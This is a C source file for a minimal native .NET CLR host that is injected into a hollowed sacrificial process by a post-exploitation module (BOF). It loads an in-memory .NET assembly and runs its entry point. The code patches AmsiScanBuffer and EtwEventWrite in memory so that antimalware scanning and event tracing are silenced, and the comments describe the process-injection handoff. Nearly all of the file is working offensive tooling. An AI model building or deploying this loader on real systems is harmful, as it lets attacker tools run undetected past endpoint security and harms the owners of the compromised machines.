/*
 * dotnet_host.c — Minimal native .NET CLR host for hollow BOF injection.
 *
 * Hollowed into a sacrificial child process. Bootstraps CLR v4, loads a
 * .NET assembly from a memory buffer, invokes its entry point with args.
 * Only imports kernel32.dll; all other APIs resolved at runtime.
 *
 * Data passing: BOF writes a config struct + assembly + args into child
 * memory via VirtualAllocEx/WriteProcessMemory, then sets RCX (first arg)
 * to that address before resuming the main thread.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -nostdlib -O2 -s -e _start \
 *       dotnet_host.c -lkernel32 -o dotnet_host.exe
 */

#include <windows.h>
#include <stdint.h>

/* ================================================================
 *  Config struct — filled by BOF in child's memory
 * ================================================================ */

typedef struct {
    uint32_t magic;         /* 0x444E4554 ("DNET") */
    uint32_t asm_size;      /* .NET assembly byte count */
    uint32_t args_size;     /* args wide string size in bytes (incl null) */
    uint32_t flags;         /* bit 0: AMSI, bit 1: ETW */
    /* assembly bytes follow at (this + 1) */
    /* args wstring follows at (this + 1) + asm_size */
} DOTNET_CONFIG;

#define CFG_MAGIC    0x444E4554
#define FLAG_AMSI    1
#define FLAG_ETW     2

/* ================================================================
 *  COM GUIDs
 * ================================================================ */

static const GUID CLSID_CLRMetaHost    = {0x9280188d,0x0e8e,0x4867,{0xb3,0x0c,0x7f,0xa8,0x38,0x84,0xe8,0xde}};
static const GUID IID_ICLRMetaHost     = {0xD332DB9E,0xB9B3,0x4125,{0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16}};
static const GUID CLSID_CorRuntimeHost = {0xCB2F6723,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E}};
static const GUID IID_ICorRuntimeHost  = {0xCB2F6722,0xAB3A,0x11D2,{0x9C,0x40,0x00,0xC0,0x4F,0xA3,0x0A,0x3E}};
static const GUID IID_AppDomain        = {0x05F696DC,0x2B29,0x3663,{0xAD,0x8B,0xC4,0x38,0x9C,0xF2,0xA7,0x13}};

/* ================================================================
 *  COM vtable indices (battle-tested, .NET 4.x)
 * ================================================================ */

#define METAHOST_GET_RUNTIME       3
#define RUNTIMEINFO_GET_INTERFACE  9
#define RUNTIMEHOST_START          10
#define RUNTIMEHOST_CREATE_DOMAIN  12
#define APPDOMAIN_LOAD_3           45
#define ASSEMBLY_GET_ENTRYPOINT    16
#define METHODINFO_INVOKE_3        42

/* ================================================================
 *  SAFEARRAY / VARIANT / BSTR types (no oleaut32 header needed)
 * ================================================================ */

#pragma pack(push, 8)

typedef struct {
    ULONG cElements;
    LONG  lLbound;
} MY_SAFEARRAYBOUND;

typedef struct {
    USHORT cDims;
    USHORT fFeatures;
    ULONG  cbElements;
    ULONG  cLocks;
    PVOID  pvData;
    MY_SAFEARRAYBOUND rgsabound[1];
} MY_SAFEARRAY;

typedef struct {
    VARTYPE vt;
    WORD    wReserved1;
    WORD    wReserved2;
    WORD    wReserved3;
    union {
        LONG_PTR   llVal;
        LONG       lVal;
        MY_SAFEARRAY *parray;
        void       *pvoid;
    };
} MY_VARIANT;

#pragma pack(pop)

#define MY_VT_NULL    1
#define MY_VT_BSTR    8
#define MY_VT_ARRAY   0x2000
#define MY_VT_UI1     17

/* ================================================================
 *  Stack probe stub — needed by -nostdlib when locals exceed 4KB
 * ================================================================ */

void ___chkstk_ms(void);
__asm__(
    ".globl ___chkstk_ms\n"
    "___chkstk_ms:\n"
    "    push   %rcx\n"
    "    push   %rax\n"
    "    cmp    $0x1000, %rax\n"
    "    lea    0x18(%rsp), %rcx\n"
    "    jb     2f\n"
    "1:  sub    $0x1000, %rcx\n"
    "    test   %rcx, (%rcx)\n"
    "    sub    $0x1000, %rax\n"
    "    cmp    $0x1000, %rax\n"
    "    ja     1b\n"
    "2:  sub    %rax, %rcx\n"
    "    test   %rcx, (%rcx)\n"
    "    pop    %rax\n"
    "    pop    %rcx\n"
    "    ret\n"
);

/* Function typedefs for runtime-resolved APIs */
typedef HRESULT (WINAPI *CLRCreateInstance_t)(const GUID*, const GUID*, void**);
typedef MY_SAFEARRAY* (WINAPI *SafeArrayCreate_t)(VARTYPE, UINT, MY_SAFEARRAYBOUND*);
typedef HRESULT (WINAPI *SafeArrayAccessData_t)(MY_SAFEARRAY*, void**);
typedef HRESULT (WINAPI *SafeArrayUnaccessData_t)(MY_SAFEARRAY*);
typedef HRESULT (WINAPI *SafeArrayDestroy_t)(MY_SAFEARRAY*);
typedef HRESULT (WINAPI *SafeArrayPutElement_t)(MY_SAFEARRAY*, LONG*, void*);
typedef BSTR    (WINAPI *SysAllocString_t)(const OLECHAR*);
typedef void    (WINAPI *SysFreeString_t)(BSTR);
typedef HRESULT (WINAPI *CoInitializeEx_t)(void*, DWORD);

/* Generic COM vtable call — returns HRESULT via function pointer at vtable[idx] */
#define VTBL(obj, idx) (((void***)(obj))[0][(idx)])

/* ================================================================
 *  Minimal helpers (no CRT)
 * ================================================================ */

static void my_memcpy(void *dst, const void *src, SIZE_T n) {
    BYTE *d = (BYTE*)dst;
    const BYTE *s = (const BYTE*)src;
    while (n--) *d++ = *s++;
}

static void my_memset(void *dst, int c, SIZE_T n) {
    BYTE *d = (BYTE*)dst;
    while (n--) *d++ = (BYTE)c;
}

static int my_wcslen(const WCHAR *s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

/* ================================================================
 *  AMSI patch: AmsiScanBuffer → xor eax,eax; ret
 * ================================================================ */

static void PatchAMSI(void) {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pScan) return;

    DWORD oldProt = 0;
    if (VirtualProtect((LPVOID)pScan, 4, PAGE_READWRITE, &oldProt)) {
        BYTE patch[] = { 0x31, 0xC0, 0xC3 }; /* xor eax,eax; ret */
        my_memcpy((void*)pScan, patch, 3);
        VirtualProtect((LPVOID)pScan, 4, oldProt, &oldProt);
    }
}

/* ================================================================
 *  ETW patch: EtwEventWrite → xor eax,eax; ret
 * ================================================================ */

static void PatchETW(void) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtw) return;

    DWORD oldProt = 0;
    if (VirtualProtect((LPVOID)pEtw, 4, PAGE_READWRITE, &oldProt)) {
        BYTE patch[] = { 0x33, 0xC0, 0xC3 };
        my_memcpy((void*)pEtw, patch, 3);
        VirtualProtect((LPVOID)pEtw, 4, oldProt, &oldProt);
    }
}

/* ================================================================
 *  Split wide string args by space into array of BSTR
 *  Returns count of args. argsBstr[] filled with SysAllocString'd BSTRs.
 * ================================================================ */

static int SplitArgs(const WCHAR *argsW, SysAllocString_t pSysAllocString,
                     BSTR *argsBstr, int maxArgs) {
    if (!argsW || !argsW[0]) return 0;

    int count = 0;
    const WCHAR *p = argsW;
    WCHAR buf[4096];

    while (*p && count < maxArgs) {
        while (*p == L' ') p++;
        if (!*p) break;

        int i = 0;
        if (*p == L'"') {
            p++;
            while (*p && *p != L'"' && i < 4095) buf[i++] = *p++;
            if (*p == L'"') p++;
        } else {
            while (*p && *p != L' ' && i < 4095) buf[i++] = *p++;
        }
        buf[i] = 0;
        argsBstr[count++] = pSysAllocString(buf);
    }
    return count;
}

/* ================================================================
 *  Entry point — receives DOTNET_CONFIG* in RCX from hollow BOF
 * ================================================================ */

void __attribute__((noreturn)) _start(DOTNET_CONFIG *cfg) {

    /* Validate magic */
    if (!cfg || cfg->magic != CFG_MAGIC)
        ExitProcess(0xDEAD0001);

    BYTE  *asmBytes  = (BYTE*)(cfg + 1);
    WCHAR *argsW     = (WCHAR*)(asmBytes + cfg->asm_size);
    DWORD  asmSize   = cfg->asm_size;

    /* Patch AMSI + ETW before touching CLR */
    if (cfg->flags & FLAG_AMSI) PatchAMSI();
    if (cfg->flags & FLAG_ETW)  PatchETW();

    /* Resolve oleaut32 APIs */
    HMODULE hOleaut32 = LoadLibraryA("oleaut32.dll");
    if (!hOleaut32) ExitProcess(0xDEAD0002);

    SafeArrayCreate_t      pSafeArrayCreate     = (SafeArrayCreate_t)GetProcAddress(hOleaut32, "SafeArrayCreate");
    SafeArrayAccessData_t  pSafeArrayAccessData = (SafeArrayAccessData_t)GetProcAddress(hOleaut32, "SafeArrayAccessData");
    SafeArrayUnaccessData_t pSafeArrayUnaccessData = (SafeArrayUnaccessData_t)GetProcAddress(hOleaut32, "SafeArrayUnaccessData");
    SafeArrayDestroy_t     pSafeArrayDestroy    = (SafeArrayDestroy_t)GetProcAddress(hOleaut32, "SafeArrayDestroy");
    SafeArrayPutElement_t  pSafeArrayPutElement = (SafeArrayPutElement_t)GetProcAddress(hOleaut32, "SafeArrayPutElement");
    SysAllocString_t       pSysAllocString      = (SysAllocString_t)GetProcAddress(hOleaut32, "SysAllocString");
    SysFreeString_t        pSysFreeString       = (SysFreeString_t)GetProcAddress(hOleaut32, "SysFreeString");

    if (!pSafeArrayCreate || !pSafeArrayAccessData || !pSafeArrayUnaccessData ||
        !pSafeArrayDestroy || !pSafeArrayPutElement || !pSysAllocString)
        ExitProcess(0xDEAD0003);

    /* Resolve mscoree!CLRCreateInstance */
    HMODULE hMscoree = LoadLibraryA("mscoree.dll");
    if (!hMscoree) ExitProcess(0xDEAD0004);

    CLRCreateInstance_t pCLRCreateInstance = (CLRCreateInstance_t)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!pCLRCreateInstance) ExitProcess(0xDEAD0005);

    /* CLR bootstrap */
    HRESULT hr;
    void *pMetaHost = NULL;
    hr = pCLRCreateInstance(&CLSID_CLRMetaHost, &IID_ICLRMetaHost, &pMetaHost);
    if (hr != 0 || !pMetaHost) ExitProcess(0xDEAD0010);

    /* ICLRMetaHost::GetRuntime("v4.0.30319") → ICLRRuntimeInfo */
    void *pRuntimeInfo = NULL;
    typedef HRESULT (__stdcall *GetRuntime_t)(void*, LPCWSTR, const GUID*, void**);
    GetRuntime_t fnGetRuntime = (GetRuntime_t)VTBL(pMetaHost, METAHOST_GET_RUNTIME);
    hr = fnGetRuntime(pMetaHost, L"v4.0.30319", &IID_ICLRMetaHost, &pRuntimeInfo);

    /* Fallback: try without specific IID — some implementations want IID_ICLRRuntimeInfo */
    if (hr != 0 || !pRuntimeInfo) {
        static const GUID IID_ICLRRuntimeInfo = {0xBD39D1D2,0xBA2F,0x486a,{0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91}};
        hr = fnGetRuntime(pMetaHost, L"v4.0.30319", &IID_ICLRRuntimeInfo, &pRuntimeInfo);
        if (hr != 0 || !pRuntimeInfo) ExitProcess(0xDEAD0011);
    }

    /* ICLRRuntimeInfo::GetInterface(CLSID_CorRuntimeHost) → ICorRuntimeHost */
    void *pRuntimeHost = NULL;
    typedef HRESULT (__stdcall *GetInterface_t)(void*, const GUID*, const GUID*, void**);
    GetInterface_t fnGetInterface = (GetInterface_t)VTBL(pRuntimeInfo, RUNTIMEINFO_GET_INTERFACE);
    hr = fnGetInterface(pRuntimeInfo, &CLSID_CorRuntimeHost, &IID_ICorRuntimeHost, &pRuntimeHost);
    if (hr != 0 || !pRuntimeHost) ExitProcess(0xDEAD0012);

    /* ICorRuntimeHost::Start() */
    typedef HRESULT (__stdcall *Start_t)(void*);
    Start_t fnStart = (Start_t)VTBL(pRuntimeHost, RUNTIMEHOST_START);
    hr = fnStart(pRuntimeHost);
    if (hr != 0) ExitProcess(0xDEAD0013);

    /* ICorRuntimeHost::CreateDomain("D") → IUnknown (AppDomain) */
    void *pAppDomainThunk = NULL;
    typedef HRESULT (__stdcall *CreateDomain_t)(void*, LPCWSTR, void*, void**);
    CreateDomain_t fnCreateDomain = (CreateDomain_t)VTBL(pRuntimeHost, RUNTIMEHOST_CREATE_DOMAIN);
    hr = fnCreateDomain(pRuntimeHost, L"HollowDomain", NULL, &pAppDomainThunk);
    if (hr != 0 || !pAppDomainThunk) ExitProcess(0xDEAD0014);

    /* QueryInterface for _AppDomain */
    void *pAppDomain = NULL;
    typedef HRESULT (__stdcall *QI_t)(void*, const GUID*, void**);
    QI_t fnQI = (QI_t)VTBL(pAppDomainThunk, 0);
    hr = fnQI(pAppDomainThunk, &IID_AppDomain, &pAppDomain);
    if (hr != 0 || !pAppDomain) ExitProcess(0xDEAD0015);

    /* Create SAFEARRAY of bytes for assembly */
    MY_SAFEARRAYBOUND asmBound = { asmSize, 0 };
    MY_SAFEARRAY *pAsmArray = pSafeArrayCreate(MY_VT_UI1, 1, &asmBound);
    if (!pAsmArray) ExitProcess(0xDEAD0020);

    void *asmData = NULL;
    pSafeArrayAccessData(pAsmArray, &asmData);
    my_memcpy(asmData, asmBytes, asmSize);
    pSafeArrayUnaccessData(pAsmArray);

    /* _AppDomain::Load_3(byte[]) → _Assembly */
    void *pAssembly = NULL;
    typedef HRESULT (__stdcall *Load3_t)(void*, MY_SAFEARRAY*, void**);
    Load3_t fnLoad3 = (Load3_t)VTBL(pAppDomain, APPDOMAIN_LOAD_3);
    hr = fnLoad3(pAppDomain, pAsmArray, &pAssembly);
    pSafeArrayDestroy(pAsmArray);
    if (hr != 0 || !pAssembly) ExitProcess(0xDEAD0021);

    /* _Assembly::get_EntryPoint() → _MethodInfo */
    void *pMethodInfo = NULL;
    typedef HRESULT (__stdcall *GetEntryPoint_t)(void*, void**);
    GetEntryPoint_t fnGetEntryPoint = (GetEntryPoint_t)VTBL(pAssembly, ASSEMBLY_GET_ENTRYPOINT);
    hr = fnGetEntryPoint(pAssembly, &pMethodInfo);
    if (hr != 0 || !pMethodInfo) ExitProcess(0xDEAD0022);

    /* Build args array for _MethodInfo::Invoke_3 */
    /* Main(string[] args) → params is SAFEARRAY of VARIANT, 1 element = the string[] */
    MY_VARIANT vNull;
    my_memset(&vNull, 0, sizeof(vNull));
    vNull.vt = MY_VT_NULL;

    MY_SAFEARRAY *pParamsArray = NULL;
    MY_VARIANT    retVal;
    my_memset(&retVal, 0, sizeof(retVal));

    if (cfg->args_size > 0 && argsW[0]) {
        /* Split args string into individual BSTR arguments */
        BSTR argsBstr[256];
        int argc = SplitArgs(argsW, pSysAllocString, argsBstr, 256);

        /* Create SAFEARRAY of BSTR for the string[] */
        MY_SAFEARRAYBOUND strBound = { (ULONG)(argc > 0 ? argc : 1), 0 };
        MY_SAFEARRAY *pStrArray = pSafeArrayCreate(MY_VT_BSTR, 1, &strBound);

        if (argc > 0) {
            for (int i = 0; i < argc; i++) {
                LONG idx = i;
                pSafeArrayPutElement(pStrArray, &idx, argsBstr[i]);
            }
        }

        /* Wrap in VARIANT */
        MY_VARIANT vArgs;
        my_memset(&vArgs, 0, sizeof(vArgs));
        vArgs.vt = MY_VT_ARRAY | MY_VT_BSTR;
        vArgs.parray = pStrArray;

        /* Create outer SAFEARRAY(VARIANT) with 1 element */
        MY_SAFEARRAYBOUND paramBound = { 1, 0 };
        pParamsArray = pSafeArrayCreate(12 /* VT_VARIANT */, 1, &paramBound);
        LONG zero = 0;
        pSafeArrayPutElement(pParamsArray, &zero, &vArgs);
    } else {
        /* No args — pass NULL params (some tools have Main() with no args) */
        pParamsArray = NULL;
    }

    /* _MethodInfo::Invoke_3(obj=null, params, retval) */
    typedef HRESULT (__stdcall *Invoke3_t)(void*, MY_VARIANT, MY_SAFEARRAY*, MY_VARIANT*);
    Invoke3_t fnInvoke3 = (Invoke3_t)VTBL(pMethodInfo, METHODINFO_INVOKE_3);
    hr = fnInvoke3(pMethodInfo, vNull, pParamsArray, &retVal);

    /* Cleanup (process will die anyway, but be thorough) */
    if (pParamsArray) pSafeArrayDestroy(pParamsArray);

    ExitProcess(hr == 0 ? 0 : (UINT)hr);
}
